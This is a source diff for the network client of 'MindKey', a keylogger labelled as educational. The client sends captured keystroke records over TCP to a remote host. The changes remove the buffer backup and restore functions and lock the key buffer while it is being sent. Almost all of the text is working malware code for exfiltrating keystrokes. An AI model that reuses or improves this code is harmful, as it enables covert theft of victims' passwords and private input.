@@ -3,7 +3,7 @@
  * it was written for educational and recreational purposes only
  * and the author does not endorse illegal use.
  *
- * Copyright (C) 2014 Blackhack <https://github.com/blackhack/MindKey/>
+ * Copyright (C) 2013 - 2014 Blackhack <https://github.com/blackhack/MindKey/>
  *
  * This program is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -37,8 +37,6 @@ void Client::StartSendOperations()
         boost::asio::ip::tcp::resolver::query query(_host, _port);
         boost::asio::ip::tcp::resolver::iterator endpointIterator = resolver.resolve(query);
 
-        BackupKeyBuffer();
-
         boost::asio::async_connect(_connection.socket(), endpointIterator,
             boost::bind(&Client::HandleConnect, this,
             boost::asio::placeholders::error));
@@ -47,18 +45,19 @@ void Client::StartSendOperations()
     catch (std::exception& e)
     {
         std::cerr << e.what() << std::endl;
-        StartSendOperations();
     }
 }
 
 void Client::HandleConnect(const boost::system::error_code& e)
 {
     if (!e)
-        _connection.async_write(_stocksBackup, boost::bind(&Client::HandleWrite, this, boost::asio::placeholders::error));
+    {
+        _keysBufferLock.lock(); // Bloqueamos el buffer hasta que los datos sean enviados.
+        _connection.async_write(_keyBuffer, boost::bind(&Client::HandleWrite, this, boost::asio::placeholders::error));
+    }
     else
     {
         std::cerr << e.message() << std::endl;
-        RestoreKeyBuffer();
         StartSendOperations();
     }
 }
@@ -66,43 +65,16 @@ void Client::HandleConnect(const boost::system::error_code& e)
 void Client::HandleWrite(const boost::system::error_code& e)
 {
     if (!e)
-        _stocksBackup.clear();
-    else
-        RestoreKeyBuffer();
+        _keyBuffer.clear();
+
+    _keysBufferLock.unlock(); // Unlock buffer
 
     StartSendOperations();
 }
 
-
-void Client::BackupKeyBuffer()
-{
-    _keysBufferLock.lock();
-    _stocksBackup = _stocks;
-    _stocks.clear();
-    _keysBufferLock.unlock();
-}
-
-void Client::RestoreKeyBuffer()
-{
-    _keysBufferLock.lock();
-
-    std::vector<KeyDataStruct> currentBuffer = _stocks;
-
-    _stocks = _stocksBackup;
-
-    for(std::vector<KeyDataStruct>::iterator i = currentBuffer.begin(); i != currentBuffer.end(); i++)
-        _stocks.push_back((*i));
-
-    currentBuffer.clear();
-    _stocksBackup.clear();
-
-    _keysBufferLock.unlock();
-}
-
-
 void Client::AddKeyInfo(KeyDataStruct info)
 {
     _keysBufferLock.lock();
-    _stocks.push_back(info);
+    _keyBuffer.push_back(info);
     _keysBufferLock.unlock();
 }
